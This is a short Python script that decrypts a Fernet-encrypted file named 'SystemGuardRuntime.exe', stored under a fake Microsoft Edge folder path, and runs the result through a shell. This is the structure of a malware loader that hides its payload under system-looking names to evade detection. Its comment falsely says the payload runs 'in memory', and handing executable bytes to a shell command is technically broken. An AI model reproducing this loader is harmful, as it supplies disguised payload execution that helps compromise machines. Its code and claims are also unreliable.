import os
from cryptography.fernet import Fernet
import subprocess

def load_key(key_file):
    with open(key_file, 'rb') as key_file:
        key = key_file.read()
    return key

def decrypt_file(input_file, key):
    fernet = Fernet(key)
    
    with open(input_file, 'rb') as file:
        file_data = file.read()
    
    decrypted_data = fernet.decrypt(file_data)
    
    return decrypted_data

def run_decrypted_file(decrypted_data):
    try:
        # Run the decrypted data directly in memory
        subprocess.run(decrypted_data, shell=True)

        print("Decrypted file executed successfully.")

    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    key = load_key("C:\\Apps\\Windows\\MicrosoftEdge\\set\\f\\encryption_key.txt")
    decrypted_data = decrypt_file("C:\\Apps\\Windows\\MicrosoftEdge\\set\\f\\SystemGuardRuntime.exe", key)
    run_decrypted_file(decrypted_data)
